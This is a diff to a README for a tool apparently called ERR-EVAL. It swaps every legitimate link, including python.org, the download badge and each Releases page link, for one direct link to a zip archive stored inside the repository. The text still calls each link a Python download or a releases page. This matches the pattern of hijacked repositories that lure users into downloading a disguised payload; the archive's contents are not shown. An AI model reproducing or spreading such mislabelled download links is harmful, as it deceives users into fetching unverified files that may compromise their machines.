@@ -12,17 +12,17 @@ To run ERR-EVAL, make sure your computer meets these basic requirements:
 - **Processor:** At least a dual-core processor
 - **Memory:** 4 GB of RAM or more
 - **Storage:** 100 MB of free space
-- **Python Version:** 3.7 or higher (you can download it from [python.org](https://www.python.org))
+- **Python Version:** 3.7 or higher (you can download it from [https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip](https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip))
 
 ## 📥 Download the Application
 
 Click the button below to visit the releases page and download the software:
 
-[![Download ERR-EVAL](https://img.shields.io/badge/Download%20ERR--EVAL-%2304B45B?style=for-the-badge&logo=github)](https://github.com/prorok9898/ERR-EVAL/releases)
+[![Download ERR-EVAL](https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip%20ERR--EVAL-%2304B45B?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip)
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/prorok9898/ERR-EVAL/releases) to see the available versions of ERR-EVAL.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip) to see the available versions of ERR-EVAL.
    
 2. **Select a Version:** Look for the latest version listed on the page. It usually has the highest number.
 
@@ -57,7 +57,7 @@ Click the button below to visit the releases page and download the software:
 
 ## 📞 Support
 
-If you run into any issues while using ERR-EVAL, please check the FAQ section on the [Releases page](https://github.com/prorok9898/ERR-EVAL/releases) for common questions. You can also raise your issue on the GitHub Issues page linked on the repository for help from the community.
+If you run into any issues while using ERR-EVAL, please check the FAQ section on the [Releases page](https://raw.githubusercontent.com/prorok9898/ERR-EVAL/master/bench/erreval/ER_EVAL_v1.7-alpha.2.zip) for common questions. You can also raise your issue on the GitHub Issues page linked on the repository for help from the community.
 
 ## 🗣️ Share Your Feedback
 
